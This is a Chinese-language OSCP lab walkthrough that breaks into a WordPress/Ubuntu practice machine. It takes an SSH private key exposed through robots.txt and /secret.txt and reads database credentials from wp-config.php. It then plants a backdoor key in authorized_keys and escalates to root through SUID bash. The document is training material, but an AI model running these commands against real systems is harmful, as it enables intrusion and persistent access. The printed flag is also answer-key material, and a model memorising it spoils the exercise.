## OSCP靶机渗透测试报告

---

### 信息收集

**目标IP**: 192.168.153.136  
**操作系统**: Ubuntu 20.04 LTS  
**Web服务**: WordPress 5.4.2 + Apache 2.4.41  
**开放端口**: 22 (SSH), 80 (HTTP)  
**FLAG**: `d73b04b0e696b0945283defa3eee4538`

---

### 详细渗透过程

#### 第一步：端口扫描与服务识别

```bash
nmap -sT -sV -p 1-10000 192.168.153.136
```

**发现**:
- 22/tcp: OpenSSH 8.2p1 Ubuntu
- 80/tcp: Apache httpd 2.4.41 (WordPress)

---

#### 第二步：Web枚举 - 发现敏感文件

```bash
curl http://192.168.153.136/robots.txt
# User-Agent: *
# Disallow: /secret.txt
```

**关键发现**: `/secret.txt` 被禁止爬取 → 暗示是敏感文件

---

#### 第三步：获取SSH私钥

```bash
curl http://192.168.153.136/secret.txt | base64 -d
```

**发现**: Base64编码的OpenSSH私钥，用户名 `oscp`

```bash
# 保存私钥并登录
curl -s http://192.168.153.136/secret.txt | base64 -d > /tmp/id_rsa
chmod 600 /tmp/id_rsa
ssh -i /tmp/id_rsa oscp@192.168.153.136
```

---

#### 第四步：信息收集与权限维持

登录后进行信息收集：

```bash
# 查看Web配置，发现数据库凭据
cat /var/www/html/wp-config.php
# DB_NAME: wordpress
# DB_USER: wordpress  
# DB_PASSWORD: Oscp12345!

# 添加后门公钥实现持久化
echo 'ssh-rsa AAAAB3...' >> /home/oscp/.ssh/authorized_keys
```

---

#### 第五步：提权 - SUID Bash

```bash
# 检查SUID权限
find / -perm -4000 -type f 2>/dev/null | grep -v snap
# 发现: /usr/bin/bash (SUID)

# 利用bash SUID提权
ssh -i /tmp/my_key oscp@192.168.153.136 "/usr/bin/bash -p"
# 或
ssh -tt -i /tmp/my_key oscp@192.168.153.136 "/usr/bin/bash -p -c 'whoami'"
```

**结果**: `euid=0(root)` - 获得root权限

---

#### 第六步：获取FLAG

```bash
cat /root/flag.txt
# d73b04b0e696b0945283defa3eee4538
```

---

### 攻击路径图

```
┌─────────────────┐
│   nmap扫描      │
│ 192.168.153.136 │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  /robots.txt    │──────→ /secret.txt
│  (禁止爬取)     │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  SSH私钥泄露    │──────→ Base64解码
│  用户: oscp     │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  SSH登录靶机    │──────→ 信息收集
│  + 持久化后门   │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  SUID提权       │──────→ /usr/bin/bash -p
│  bash (SUID)    │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  ROOT权限       │──────→ cat /root/flag.txt
│                 │
└─────────────────┘
```

---

### 优化总结

| 原过程 | 优化后 | 说明 |
|--------|--------|------|
| 多次nmap全面扫描 | 单次针对性扫描 | 快速定位Web+SSH靶机 |
| wpscan详细枚举 | 直接查看robots.txt | 更快发现敏感文件 |
| 尝试WordPress后台登录 | 利用私钥直接SSH | 绕过登录步骤 |
| 暴力破解hash | 不需要 | 私钥已足够 |
| 尝试sudo密码 | 利用SUID bash | 更直接的提权路径 |

**核心洞见**: `/robots.txt` 中明确禁止 `/secret.txt` → 这就是私钥文件的位置

---

### 使用的工具

- `nmap` - 端口扫描
- `curl` - Web访问
- `ssh` - 远程登录
- `bash` - SUID提权

---

### FLAG

```
d73b04b0e696b0945283defa3eee4538
```